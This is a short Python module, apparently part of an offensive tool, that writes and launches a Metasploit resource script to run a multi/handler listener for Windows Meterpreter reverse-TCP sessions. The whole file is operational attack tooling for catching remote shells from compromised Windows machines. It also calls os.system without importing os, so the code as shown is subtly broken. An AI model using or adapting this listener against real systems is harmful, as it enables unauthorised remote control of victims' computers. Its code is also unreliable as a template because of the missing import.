from app.core.utils import get_local_ip, spawn_terminal

import shutil

def start_listener(lhost=None, lport=4444, new_tab=False):
    if not lhost:
        lhost = get_local_ip()
    
    msf_commands = f"""
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST {lhost}
    set LPORT {lport}
    exploit
    """
    with open("listener.rc", "w") as f:
        f.write(msf_commands)
    
    cmd = "msfconsole -q -r listener.rc"
    
    if new_tab:
        if spawn_terminal(cmd):
            return
        else:
            print("[!] No supported terminal emulator found (Tmux, Gnome, Konsole, Xfce, Xterm). Running in current tab.")
    
    os.system(cmd)
